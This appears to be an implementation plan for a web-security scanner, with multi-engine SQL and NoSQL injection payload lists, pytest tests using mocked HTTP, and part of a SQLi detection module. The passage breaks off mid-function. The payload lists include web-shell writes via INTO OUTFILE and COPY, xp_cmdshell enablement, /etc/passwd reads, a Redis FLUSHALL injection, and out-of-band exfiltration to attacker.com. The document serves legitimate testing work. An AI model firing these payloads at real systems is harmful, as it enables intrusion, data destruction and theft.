# Auth-Bypass Test Cases Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Replace 22 old module-level pytest tests with 12 new xlsx-aligned test files across 6 new vulnerability modules + payloads.

**Architecture:** 6 new module files under `websec_test/modules/` each with `discover/test()` protocol + BT `CheckSpec`; 1 new payloads file `websec_test/config/payloads_sqli.py`; extended NoSQL payloads in existing `payloads.py`.

**Tech Stack:** Python 3.10+, pytest 8+, responses mocking library, websec_test framework (SessionClient, TestResult, CheckSpec, Blackboard, @register decorator).

## Global Constraints

- All tests use `@responses.activate` for HTTP mocking — no real network calls
- Target URL constant `TARGET = "http://localhost:8080/Nhom_2s"` (existing convention)
- Every module implements both standard protocol (`discover` + `test`) and BT protocol (`CheckSpec` via `@register`)
- Each CheckSpec declares `depends_on` where specified in the design spec
- Engine detection uses `blackboard["sqli_engine"]` — all SQLi checks except `engine_fingerprint` and `control_input_validation` depend on `engine_fingerprint`
- Severity mapping per spec: Nghiêm trọng → CRITICAL, Cao → HIGH, Trung bình → MEDIUM, Thấp → LOW

---

## File Structure

```
websec_test/config/
├── payloads_sqli.py              # NEW — engine-specific SQLi payload dicts
└── payloads.py                   # MODIFY — extend NOSQLI_PAYLOADS

websec_test/modules/
├── sqli.py                       # NEW — 15 checks, 6 DBMS engines
├── nosql.py                      # NEW — 8 checks, 7 NoSQL engines
├── ato.py                        # NEW — 5 checks, ATO scenarios
├── idor.py                       # NEW — 2 checks, IDOR scenarios
├── priv_escalation.py            # NEW — 8 checks, privilege escalation
└── hash.py                       # NEW — 3 checks, weak hashing

tests/
├── test_sqli.py                  # NEW
├── test_bt_checks_sqli.py        # NEW
├── test_nosql.py                 # NEW
├── test_bt_checks_nosql.py       # NEW
├── test_ato.py                   # NEW
├── test_bt_checks_ato.py         # NEW
├── test_idor.py                  # NEW
├── test_bt_checks_idor.py        # NEW
├── test_priv_escalation.py       # NEW
├── test_bt_checks_priv_escalation.py  # NEW
├── test_hash.py                  # NEW
├── test_bt_checks_hash.py        # NEW
```

---

### Task 1: Multi-Engine SQLi Payloads + Config

**Files:**
- Create: `websec_test/config/payloads_sqli.py`
- Modify: `websec_test/config/payloads.py` (extend NOSQLI_PAYLOADS)
- Test: (tested implicitly by Task 2)

**Interfaces:**
- Consumes: nothing
- Produces: `ENGINE_PAYLOADS` dict (keyed by engine name), `GENERIC_PAYLOADS` as fallback, extended `NOSQLI_PAYLOADS` with 5 more engines

- [ ] **Step 1: Create `payloads_sqli.py`**

```python
"""Engine-specific SQL injection payloads."""

ENGINE_PAYLOADS = {
    "mysql": {
        "auth_bypass": [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "admin' -- ",
            "admin'#",
            "' OR 1=1; #",
            "' OR '1'='1' #",
        ],
        "error": [
            "'",
            "1'",
            "1/0",
            "' OR 1/0 --",
            "2-1",
        ],
        "union_order": [
            "1 ORDER BY 1 --",
            "1 ORDER BY 2 --",
            "1 ORDER BY 3 --",
            "1 ORDER BY 4 --",
            "1 ORDER BY 5 --",
            "1 ORDER BY 6 --",
            "-1 UNION SELECT 1,2,3 --",
            "-1 UNION SELECT 1,2,database(),4 --",
            "-1 UNION SELECT 1,2,3,4,5,6 --",
        ],
        "time": [
            "' OR SLEEP(5) --",
            "' OR SLEEP(10) --",
            "1' AND SLEEP(5) --",
            "1'; SELECT SLEEP(5); --",
        ],
        "filter_bypass": [
            "'UNION/**/SELECT/**/NULL,username/**/FROM/**/users--",
            "'UNION%09SELECT%09NULL%09FROM%09users--",
            "'uNiOn SeLeCt NULL,username FROM users--",
            "'UN/**/ION SE/**/LECT NULL,username FROM users--",
            "WHERE username=0x61646D696E",
            "' || 1=1 --",
            "' && 1=1 --",
        ],
        "waf_bypass": [
            "?id=1&id=' UNION SELECT NULL--",
            "Transfer-Encoding: chunked",
        ],
        "header": {
            "user-agent": "' OR 1=1 --",
            "referer": "' OR 1=1 --",
            "cookie": "' OR 1=1 --",
            "x-forwarded-for": "' OR 1=1 --",
            "accept-language": "' OR 1=1 --",
        },
        "search": [
            "%",
            "_",
            "test' UNION SELECT NULL,username,password,NULL FROM users--",
            "test%' UNION SELECT NULL,username,password,NULL FROM users--",
            "test' AND 1=1 --",
            "test' AND 1=2 --",
            "test' AND SLEEP(5) --",
            "test' ORDER BY 1 --",
            "test' ORDER BY 5 --",
        ],
        "file_read": [
            "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL--",
            "' UNION SELECT NULL,LOAD_FILE('/var/www/html/config.php'),NULL,NULL--",
            "' UNION SELECT NULL,LOAD_FILE(0x2F6574632F706173737764),NULL,NULL--",
            "' UNION SELECT NULL,LOAD_FILE('C:\\\\windows\\\\win.ini'),NULL,NULL--",
        ],
        "file_write": [
            "' UNION SELECT NULL,'<?php system($_GET[\"cmd\"]); ?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--",
            "' UNION SELECT NULL,0x3C3F7068702073797374656D28245F4745545B22636D64225D293B203F3E,NULL,NULL INTO DUMPFILE '/var/www/html/shell.php'--",
        ],
        "oob": [
            "' AND LOAD_FILE(CONCAT('\\\\\\\\', (SELECT version()), '.attacker.com\\\\share'))--",
        ],
        "version": [
            "SELECT version()",
            "SELECT @@version",
        ],
    },
    "postgres": {
        "auth_bypass": [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "admin' -- ",
        ],
        "error": [
            "'",
            "CAST(1 AS INT)",
        ],
        "union_order": [
            "1 ORDER BY 1 --",
            "1 ORDER BY 2 --",
            "-1 UNION SELECT NULL,NULL,NULL --",
            "-1 UNION VALUES (1,2,3) --",
        ],
        "time": [
            "' OR pg_sleep(5) --",
            "' OR pg_sleep(10) --",
        ],
        "file_read": [
            "' UNION SELECT NULL,pg_read_file('/etc/passwd'),NULL,NULL--",
        ],
        "file_write": [
            "'; COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php'--",
        ],
        "oob": [
            "'; SELECT dblink_connect('host=attacker.com dbname='||(SELECT version())||'')--",
        ],
        "version": [
            "SELECT version()",
        ],
    },
    "mssql": {
        "auth_bypass": [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "admin' -- ",
        ],
        "error": [
            "'",
            "CONVERT(1, INT)",
        ],
        "union_order": [
            "1 ORDER BY 1 --",
            "-1 UNION SELECT NULL,NULL,NULL --",
        ],
        "time": [
            "1; WAITFOR DELAY '0:0:5'--",
            "1; WAITFOR DELAY '0:0:10'--",
        ],
        "filter_bypass": [
            "WHERE username=CHAR(97,100,109,105,110)",
        ],
        "file_read": [
            "' UNION SELECT NULL,BulkColumn,NULL,NULL FROM OPENROWSET(BULK 'C:\\\\inetpub\\\\wwwroot\\\\web.config', SINGLE_CLOB) AS x--",
        ],
        "file_write": [
            "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--",
            "'; EXEC xp_cmdshell 'whoami'--",
        ],
        "oob": [
            "'; DECLARE @d VARCHAR(1024); SELECT @d=(SELECT TOP 1 username FROM users); EXEC master.dbo.xp_dirtree '\\\\'+@d+'.attacker.com\\share'--",
        ],
        "version": [
            "SELECT @@version",
        ],
    },
    "oracle": {
        "auth_bypass": [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
        ],
        "error": [
            "'",
            "UTL_INADDR.get_host_name()",
        ],
        "union_order": [
            "1 ORDER BY 1 --",
            "-1 UNION SELECT NULL,NULL FROM dual --",
        ],
        "time": [
            "' OR DBMS_LOCK.SLEEP(5) --",
        ],
        "oob": [
            "' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--",
        ],
        "version": [
            "SELECT banner FROM v$version",
        ],
    },
    "sqlite": {
        "auth_bypass": [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
        ],
        "error": [
            "'",
        ],
        "union_order": [
            "1 ORDER BY 1 --",
            "-1 UNION SELECT NULL,NULL --",
        ],
        "time": [
            "' OR randomblob(100000000) --",
        ],
        "version": [
            "SELECT sqlite_version()",
        ],
    },
}

GENERIC_PAYLOADS = {
    "auth_bypass": [
        "' OR '1'='1",
        "' OR '1'='1' -- ",
        "admin' -- ",
    ],
    "error": ["'"],
    "union_order": [
        "1 ORDER BY 1 --",
        "-1 UNION SELECT NULL --",
    ],
    "time": ["' OR SLEEP(5) --"],
}
```

- [ ] **Step 2: Extend `payloads.py` NoSQL section**

Append to `NOSQLI_PAYLOADS` in `websec_test/config/payloads.py`:

Add the new NoSQL engines after the existing MongoDB `field_injection` entry:

```python
    "couchdb": [
        {"$gt": None},
        {"$exists": True},
        {"$regex": ""},
    ],
    "cassandra": [
        "' OR '1'='1",
        "' ALLOW FILTERING--",
    ],
    "dynamodb": [
        {"KeyConditionExpression": "userid = :val AND attribute_exists(#attr)"},
        {"FilterExpression": "price <> :val"},
        {"ProjectionExpression": "password"},
    ],
    "firebase": [
        "auth=admin",
        '{"priority": {"$ne": None}}',
    ],
    "redis": [
        "key%0D%0AFLUSHALL%0D%0A",
        "key%0D%0AEVAL%20%22return%201%22%200%0D%0A",
    ],
    "neo4j": [
        "' OR 1=1 WITH n RETURN n--",
        "' } RETURN n--",
    ],
```

- [ ] **Step 3: Run existing tests to confirm no breakage**

```bash
pytest tests/test_payloads.py -v
```

Expected: all existing payload tests PASS.

- [ ] **Step 4: Commit**

```bash
git add websec_test/config/payloads_sqli.py websec_test/config/payloads.py
git commit -m "feat(config): add multi-engine SQLi payloads + extended NoSQL payloads"
```

---

### Task 2: Delete Old Module Tests

**Files:**
- Delete: 22 test files (12 standard + 10 BT check-level)

- [ ] **Step 1: Remove old module test files**

```bash
cd D:\testcase_web
Remove-Item -LiteralPath "tests\test_auth.py", "tests\test_injection.py", "tests\test_authz.py", "tests\test_csrf.py"
Remove-Item -LiteralPath "tests\test_headers.py", "tests\test_cookies.py", "tests\test_cors.py", "tests\test_ssl_tls.py", "tests\test_disclosure.py", "tests\test_methods.py"
Remove-Item -LiteralPath "tests\test_mongodb_check.py", "tests\test_integration.py"
Remove-Item -LiteralPath "tests\test_bt_checks_auth.py", "tests\test_bt_checks_injection.py", "tests\test_bt_checks_authz.py", "tests\test_bt_checks_csrf.py"
Remove-Item -LiteralPath "tests\test_bt_checks_headers.py", "tests\test_bt_checks_cookies.py", "tests\test_bt_checks_cors.py", "tests\test_bt_checks_ssl_tls.py", "tests\test_bt_checks_disclosure.py", "tests\test_bt_checks_methods.py"
```

Verify deletion:
```bash
Get-ChildItem -LiteralPath "tests" -Filter "test_*.py" | Select-Object -ExpandProperty Name
```

Confirm only engine + infra tests remain.

- [ ] **Step 2: Commit**

```bash
git add -A
git commit -m "chore(tests): remove 22 old module-level test files"
```

---

### Task 3: SQLi Module + Tests

**Files:**
- Create: `websec_test/modules/sqli.py`
- Create: `tests/test_sqli.py`
- Create: `tests/test_bt_checks_sqli.py`

**Interfaces:**
- Consumes: `ENGINE_PAYLOADS` from `payloads_sqli.py`, `SessionClient`, `Blackboard`, `CheckSpec`, `@register`, `TestResult`/`TestStatus`/`Severity`, `Endpoint` namedtuple
- Produces: `SQLiModule` class (discover + test), 15 check functions, `sqli_check_specs()` via `@register("sqli")`

- [ ] **Step 1: Write failing tests for SQLi module**

Create `tests/test_sqli.py`:

```python
"""Tests for multi-engine SQLi module."""
import responses
from websec_test.modules.sqli import SQLiModule
from websec_test.client.session import SessionClient
from websec_test.results.models import TestStatus

TARGET = "http://localhost:8080/Nhom_2s"

LOGIN_PAGE = """<html><body>
    <form method="POST" action="/login">
        <input name="username"><input name="password">
    </form>
</body></html>"""


@responses.activate
def test_discover_finds_login_form():
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    client = SessionClient(TARGET)
    module = SQLiModule()
    endpoints = module.discover(client, TARGET)
    assert len(endpoints) > 0


@responses.activate
def test_basic_auth_bypass_detected():
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.post(TARGET + "/login", status=200, body="Invalid")
    # Payload succeeds -> bypass
    responses.post(TARGET + "/login", status=200, body="Welcome to dashboard")
    client = SessionClient(TARGET)
    module = SQLiModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    bypass_tests = [r for r in results if r.test_name == "basic_auth_bypass"]
    assert len(bypass_tests) > 0
    assert bypass_tests[0].status == TestStatus.FAIL


@responses.activate
def test_basic_auth_bypass_not_detected():
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.post(TARGET + "/login", status=200, body="Invalid")
    responses.post(TARGET + "/login", status=200, body="Invalid")
    client = SessionClient(TARGET)
    module = SQLiModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    bypass_tests = [r for r in results if r.test_name == "basic_auth_bypass"]
    assert len(bypass_tests) > 0
    assert bypass_tests[0].status == TestStatus.PASS


@responses.activate
def test_error_based_sqli_detected():
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.post(TARGET + "/login", status=200, body="Invalid")
    responses.post(TARGET + "/login", status=200, body="SQL syntax error near ''")
    client = SessionClient(TARGET)
    module = SQLiModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    error_tests = [r for r in results if r.test_name == "error_based"]
    assert len(error_tests) > 0
    assert error_tests[0].status == TestStatus.FAIL


@responses.activate
def test_engine_fingerprint_mysql():
    """Engine fingerprint detects MySQL from version() response."""
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.post(TARGET + "/login", status=200, body="8.0.32")  # MySQL version
    responses.post(TARGET + "/login", status=200, body="Invalid")
    client = SessionClient(TARGET)
    module = SQLiModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    fp_tests = [r for r in results if r.test_name == "engine_fingerprint"]
    assert len(fp_tests) > 0
    assert "mysql" in fp_tests[0].evidence.lower()


@responses.activate
def test_time_based_blind_detected():
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.post(TARGET + "/login", status=200, body="Invalid")
    responses.post(TARGET + "/login", status=200, body="Invalid")  # baseline
    responses.post(TARGET + "/login", status=200, body="Invalid")  # time payload
    client = SessionClient(TARGET)
    module = SQLiModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    blind_tests = [r for r in results if r.test_name == "time_based_blind"]
    assert len(blind_tests) > 0


@responses.activate
def test_union_based_detected():
    """Union payloads that reflect extra data are detected."""
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.post(TARGET + "/login", status=200, body="Invalid")
    responses.post(TARGET + "/login", status=200, body="Invalid")
    responses.post(TARGET + "/login", status=200, body="Invalid")
    responses.post(TARGET + "/login", status=200, body="1|admin|admin_hash")  # union data reflected
    client = SessionClient(TARGET)
    module = SQLiModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    union_tests = [r for r in results if r.test_name == "union_based"]
    assert len(union_tests) > 0


@responses.activate
def test_filter_bypass_detected():
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.post(TARGET + "/login", status=200, body="Invalid")
    responses.post(TARGET + "/login", status=200, body="Invalid")
    responses.post(TARGET + "/login", status=200, body="SQL error in query")
    client = SessionClient(TARGET)
    module = SQLiModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    bypass_tests = [r for r in results if r.test_name == "filter_bypass"]
    assert len(bypass_tests) > 0
    assert bypass_tests[0].status == TestStatus.FAIL


@responses.activate
def test_header_injection_detected():
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    responses.post(TARGET + "/login", status=200, body="Invalid")
    for _ in range(5):
        responses.post(TARGET + "/login", status=200, body="SQL syntax error")
    client = SessionClient(TARGET)
    module = SQLiModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    header_tests = [r for r in results if r.test_name == "header_injection"]
    assert len(header_tests) > 0


@responses.activate
def test_search_injection_detected():
    """Search with wildcard returns all records."""
    search_page = """<html><body>
        <form method="GET" action="/search">
            <input name="q">
        </form>
    </body></html>"""
    responses.get(TARGET + "/", status=200, body=search_page)
    responses.get(TARGET + "/search?q=test", status=200, body="3 results")
    responses.get(TARGET + "/search?q=%25", status=200, body="100 results: all records")
    client = SessionClient(TARGET)
    module = SQLiModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    search_tests = [r for r in results if r.test_name == "search_injection"]
    assert len(search_tests) > 0
    assert search_tests[0].status == TestStatus.FAIL


@responses.activate
def test_control_param_query_all_rejected():
    """Control test: ALL payloads rejected -> PASS."""
    responses.get(TARGET + "/login", status=200, body=LOGIN_PAGE)
    for _ in range(50):
        responses.post(TARGET + "/login", status=200, body="Invalid credentials")
    client = SessionClient(TARGET)
    module = SQLiModule()
    endpoints = module.discover(client, TARGET)
    results = module.test(client, TARGET, endpoints)
    control_tests = [r for r in results if r.test_name == "control_param_query"]
    assert len(control_tests) > 0
    assert control_tests[0].status == TestStatus.PASS
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
pytest tests/test_sqli.py -v
```

Expected: all FAIL with `ModuleNotFoundError: No module named 'websec_test.modules.sqli'`

- [ ] **Step 3: Implement SQLi module**

Create `websec_test/modules/sqli.py`:

```python
"""Multi-engine SQL injection testing module."""
import re
import time
from collections import namedtuple
from urllib.parse import urljoin, urlencode

import requests
from websec_test.client.session import SessionClient
from websec_test.config.payloads_sqli import ENGINE_PAYLOADS, GENERIC_PAYLOADS
from websec_test.results.models import TestResult, TestStatus, Severity

Endpoint = namedtuple("Endpoint", ["url", "method"])

ENGINE_SIGNATURES = {
    "mysql": ["mysql", "mariadb"],
    "postgres": ["postgresql", "pg_", "psql"],
    "mssql": ["mssql", "sql server", "sqlserver"],
    "oracle": ["ora-", "oracle"],
    "sqlite": ["sqlite"],
}


class SQLiModule:
    """Test for SQL injection across 6 DBMS engines."""

    def __init__(self, target: str = ""):
        self.target = target
        self._engine = "generic"

    def discover(self, client: SessionClient, target: str):
        """Find login forms by checking common login paths."""
        self.target = target
        login_paths = ["/login", "/auth", "/signin", "/Login"]
        endpoints = []
        for path in login_paths:
            try:
                resp = client.get(path)
            except requests.exceptions.ConnectionError:
                continue
            if resp.status_code == 200 and ("password" in resp.text.lower()
                                            or "login" in resp.text.lower()):
                endpoints.append(Endpoint(url=path, method="POST"))
        return endpoints

    def _extract_form_action(self, html: str) -> str | None:
        match = re.search(r'<form[^>]*action=["\']([^"\']+)', html, re.IGNORECASE)
        return match.group(1) if match else None

    def _detect_engine(self, client: SessionClient, post_url: str) -> str:
        """Probe version queries to fingerprint the DBMS engine."""
        version_payloads = {
            "mysql": ["' UNION SELECT @@version --", "' UNION SELECT version() --"],
            "postgres": ["' UNION SELECT version() --"],
            "mssql": ["' UNION SELECT @@version --"],
            "oracle": ["' UNION SELECT banner FROM v$version --"],
            "sqlite": ["' UNION SELECT sqlite_version() --"],
        }
        for engine, payloads in version_payloads.items():
            for payload in payloads:
                try:
                    resp = client.post(post_url, data={"username": payload, "password": "test"})
                except requests.exceptions.RequestException:
                    continue
                resp_lower = resp.text.lower()
                if engine == "mysql" and ("mysql" in resp_lower or "mariadb" in resp_lower):
                    return engine
                if engine == "postgres" and ("postgresql" in resp_lower or "pg_" in resp_lower):
                    return engine
                if engine == "mssql" and ("microsoft" in resp_lower or "sql server" in resp_lower):
                    return engine
                if engine == "oracle" and ("oracle" in resp_lower or "ora-" in resp_lower):
                    return engine
                if engine == "sqlite" and "sqlite" in resp_lower:
                    return engine
        return "generic"

    def _get_payloads(self, category: str) -> list:
        engine = self._engine
        engine_dict = ENGINE_PAYLOADS.get(engine, {})
        payloads = engine_dict.get(category, [])
        if not payloads:
            payloads = GENERIC_PAYLOADS.get(category, [])
        return payloads

    def _check_auth_bypass(self, client: SessionClient, post_url: str) -> TestResult:
        """Check if SQLi payloads bypass authentication."""
        for payload in self._get_payloads("auth_bypass"):
            try:
                resp = client.post(post_url, data={"username": payload, "password": "test"})
            except requests.exceptions.RequestException:
                continue
            if resp.status_code == 200 and any(word in resp.text.lower()
                                               for word in ["welcome", "dashboard", "admin", "logout"]):
                return TestResult(
                    module="sqli", test_name="basic_auth_bypass",
                    status=TestStatus.FAIL, severity=Severity.CRITICAL,
                    endpoint=post_url,
                    evidence=f"Auth bypass via payload '{payload[:80]}': {resp.text[:100]}",
                    recommendation="Use parameterized queries for all login inputs",
                )
        return TestResult(
            module="sqli", test_name="basic_auth_bypass",
            status=TestStatus.PASS, severity=Severity.CRITICAL,
            endpoint=post_url,
            evidence="No auth bypass detected for tested payloads",
            recommendation="No action needed",
        )

    def _check_error_based(self, client: SessionClient, post_url: str) -> TestResult:
        """Check if SQLi payloads trigger SQL error reflection."""
        error_keywords = ["sql", "syntax error", "ora-", "mysql", "unclosed quotation",
                          "mariadb", "postgresql", "sqlite", "driver"]
        for payload in self._get_payloads("error"):
            try:
                resp = client.post(post_url, data={"username": payload, "password": "test"})
            except requests.exceptions.RequestException:
                continue
            resp_lower = resp.text.lower()
            if any(kw in resp_lower for kw in error_keywords):
                return TestResult(
                    module="sqli", test_name="error_based",
                    status=TestStatus.FAIL, severity=Severity.CRITICAL,
                    endpoint=post_url,
                    evidence=f"SQL error reflected for payload '{payload[:80]}': {resp.text[:150]}",
                    recommendation="Use parameterized queries, never expose error details",
                )
        return TestResult(
            module="sqli", test_name="error_based",
            status=TestStatus.PASS, severity=Severity.CRITICAL,
            endpoint=post_url,
            evidence="No SQL error reflection detected",
            recommendation="No action needed",
        )

    def _check_union_based(self, client: SessionClient, post_url: str) -> TestResult:
        """Check if UNION SELECT payloads reflect extra data."""
        for payload in self._get_payloads("union_order"):
            try:
                resp = client.post(post_url, data={"username": payload, "password": "test"})
            except requests.exceptions.RequestException:
                continue
            piped = resp.text.count("|")
            if piped >= 2:
                return TestResult(
                    module="sqli", test_name="union_based",
                    status=TestStatus.FAIL, severity=Severity.CRITICAL,
                    endpoint=post_url,
                    evidence=f"Extra data reflected via UNION payload '{payload[:80]}': {resp.text[:150]}",
                    recommendation="Use parameterized queries, restrict UNION operations",
                )
        return TestResult(
            module="sqli", test_name="union_based",
            status=TestStatus.PASS, severity=Severity.CRITICAL,
            endpoint=post_url,
            evidence="No UNION-based data reflection detected",
            recommendation="No action needed",
        )

    def _check_time_based(self, client: SessionClient, post_url: str) -> TestResult:
        """Check if time-based payloads cause response delay."""
        baseline_start = time.time()
        try:
            client.post(post_url, data={"username": "admin", "password": "test"})
        except requests.exceptions.RequestException:
            pass
        baseline_duration = time.time() - baseline_start

        for payload in self._get_payloads("time"):
            try:
                probe_start = time.time()
                client.post(post_url, data={"username": payload, "password": "test"})
                probe_duration = time.time() - probe_start
            except requests.exceptions.RequestException:
                continue
            if probe_duration > max(baseline_duration + 2, 3):
                return TestResult(
                    module="sqli", test_name="time_based_blind",
                    status=TestStatus.FAIL, severity=Severity.CRITICAL,
                    endpoint=post_url,
                    evidence=f"Time-based delay detected: {probe_duration:.1f}s vs baseline {baseline_duration:.1f}s. Payload: '{payload[:80]}'",
                    recommendation="Use parameterized queries, restrict SLEEP/WAIT functions",
                )
        return TestResult(
            module="sqli", test_name="time_based_blind",
            status=TestStatus.PASS, severity=Severity.CRITICAL,
            endpoint=post_url,
            evidence=f"No time-based delay detected (baseline: {baseline_duration:.1f}s)",
            recommendation="No action needed",
        )

    def _check_second_order(self, client: SessionClient, post_url: str) -> TestResult:
        """Check for second-order SQLi via stored payload."""
        import hashlib
        unique_suffix = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        stored_username = f"admin'--{unique_suffix}"
        register_url = post_url.replace("/login", "/register")
        try:
            client.post(register_url, data={"username": stored_username, "password": "test123",
                                            "email": f"{unique_suffix}@test.com", "fullname": "Test"})
        except requests.exceptions.RequestException:
            pass
        try:
            resp = client.post(post_url, data={"username": stored_username, "password": "newpass"})
        except requests.exceptions.RequestException:
            return TestResult(
                module="sqli", test_name="second_order",
                status=TestStatus.ERROR, severity=Severity.CRITICAL,
                endpoint=post_url,
                evidence="Second-order SQLi probe failed: connection error",
                recommendation="Check server availability and try again",
            )
        error_keywords = ["sql", "syntax error", "ora-", "mysql", "unclosed quotation"]
        if any(kw in resp.text.lower() for kw in error_keywords) or "welcome" in resp.text.lower():
            return TestResult(
                module="sqli", test_name="second_order",
                status=TestStatus.FAIL, severity=Severity.CRITICAL,
                endpoint=post_url,
                evidence=f"Second-order SQLi detected via stored payload '{stored_username}': {resp.text[:150]}",
                recommendation="Use parameterized queries for ALL queries, even when data comes from DB",
            )
        return TestResult(
            module="sqli", test_name="second_order",
            status=TestStatus.PASS, severity=Severity.CRITICAL,
            endpoint=post_url,
            evidence="No second-order SQLi detected",
            recommendation="No action needed",
        )

    def _check_filter_bypass(self, client: SessionClient, post_url: str) -> TestResult:
        """Check if filter bypass payloads reach the application."""
        error_keywords = ["sql", "syntax error", "ora-", "mysql", "unclosed quotation"]
        for payload in self._get_payloads("filter_bypass"):
            try:
                resp = client.post(post_url, data={"username": payload, "password": "test"})
            except requests.exceptions.RequestException:
                continue
            resp_lower = resp.text.lower()
            if any(kw in resp_lower for kw in error_keywords):
                return TestResult(
                    module="sqli", test_name="filter_bypass",
                    status=TestStatus.FAIL, severity=Severity.HIGH,
                    endpoint=post_url,
                    evidence=f"Filter bypass successful via payload '{payload[:80]}': {resp.text[:150]}",
                    recommendation="Improve input validation, add WAF rules for obfuscated payloads",
                )
        return TestResult(
            module="sqli", test_name="filter_bypass",
            status=TestStatus.PASS, severity=Severity.HIGH,
            endpoint=post_url,
            evidence="No filter bypass detected",
            recommendation="No action needed",
        )

    def _check_waf_bypass(self, client: SessionClient, post_url: str) -> TestResult:
        """Check if WAF bypass techniques work."""
        hpp_url = f"{post_url}?id=1&id=%27+UNION+SELECT+NULL--"
        try:
            resp = client.get(hpp_url)
            if resp.status_code == 200 and len(resp.text) > 50:
                return TestResult(
                    module="sqli", test_name="waf_bypass",
                    status=TestStatus.FAIL, severity=Severity.HIGH,
                    endpoint=hpp_url,
                    evidence=f"WAF bypass via HPP returned {resp.status_code}: {resp.text[:100]}",
                    recommendation="Implement server-side parameter validation, upgrade WAF rules",
                )
        except requests.exceptions.RequestException:
            pass
        return TestResult(
            module="sqli", test_name="waf_bypass",
            status=TestStatus.PASS, severity=Severity.HIGH,
            endpoint=post_url,
            evidence="No WAF bypass detected",
            recommendation="No action needed",
        )

    def _check_header_injection(self, client: SessionClient, post_url: str) -> TestResult:
        """Check SQLi via HTTP headers."""
        header_payloads = {
            "User-Agent": "' OR 1=1 --",
            "Referer": "' OR 1=1 --",
            "Cookie": "session=' OR 1=1 --",
            "X-Forwarded-For": "' OR 1=1 --",
            "Accept-Language": "' OR 1=1 --",
        }
        error_keywords = ["sql", "syntax error", "ora-", "mysql", "unclosed quotation"]
        for header, payload in header_payloads.items():
            try:
                resp = client.get(post_url, headers={header: payload})
            except requests.exceptions.RequestException:
                continue
            if "welcome" in resp.text.lower() or any(kw in resp.text.lower() for kw in error_keywords):
                return TestResult(
                    module="sqli", test_name="header_injection",
                    status=TestStatus.FAIL, severity=Severity.HIGH,
                    endpoint=post_url,
                    evidence=f"SQLi via header '{header}': {resp.text[:100]}",
                    recommendation="Validate all HTTP headers used in DB queries, use parameterized queries",
                )
        return TestResult(
            module="sqli", test_name="header_injection",
            status=TestStatus.PASS, severity=Severity.HIGH,
            endpoint=post_url,
            evidence="No header-based SQLi detected",
            recommendation="No action needed",
        )

    def _check_search_injection(self, client: SessionClient, target: str) -> TestResult:
        """Check for SQLi via search functionality."""
        search_page = None
        try:
            resp = client.get("/")
            search_page = resp.text
        except requests.exceptions.RequestException:
            return TestResult(
                module="sqli", test_name="search_injection",
                status=TestStatus.ERROR, severity=Severity.HIGH,
                endpoint="/", evidence="Failed to load main page",
                recommendation="Check server availability",
            )
        import re
        form_match = re.search(r'<form[^>]*method=["\'](get|GET)["\'][^>]*action=["\']([^"\']+)', search_page, re.DOTALL)
        if not form_match:
            return TestResult(
                module="sqli", test_name="search_injection",
                status=TestStatus.PASS, severity=Severity.HIGH,
                endpoint="/", evidence="No search forms found",
                recommendation="No action needed",
            )
        search_url = urljoin(target + "/", form_match.group(2).lstrip("/"))

        try:
            baseline = client.get(f"{search_url}?q=test")
            baseline_count = len(baseline.text)
        except requests.exceptions.RequestException:
            return TestResult(
                module="sqli", test_name="search_injection",
                status=TestStatus.ERROR, severity=Severity.HIGH,
                endpoint=search_url, evidence="Baseline search request failed",
                recommendation="Check search endpoint",
            )

        for payload in self._get_payloads("search"):
            try:
                resp = client.get(f"{search_url}?q={urlencode({'q': payload})}")
            except requests.exceptions.RequestException:
                continue
            error_keywords = ["sql", "syntax error", "ora-", "mysql"]
            if any(kw in resp.text.lower() for kw in error_keywords):
                return TestResult(
                    module="sqli", test_name="search_injection",
                    status=TestStatus.FAIL, severity=Severity.CRITICAL,
                    endpoint=search_url,
                    evidence=f"Search SQLi via payload '{payload[:80]}': {resp.text[:150]}",
                    recommendation="Use parameterized queries in search, validate input",
                )
            if abs(len(resp.text) - baseline_count) > 200:
                return TestResult(
                    module="sqli", test_name="search_injection",
                    status=TestStatus.FAIL, severity=Severity.CRITICAL,
                    endpoint=search_url,
                    evidence=f"Search result count anomaly: baseline {baseline_count}, payload returned {len(resp.text)} chars",
                    recommendation="Restrict search to use parameterized LIKE queries",
                )
        return TestResult(
            module="sqli", test_name="search_injection",
            status=TestStatus.PASS, severity=Severity.HIGH,
            endpoint=search_url,
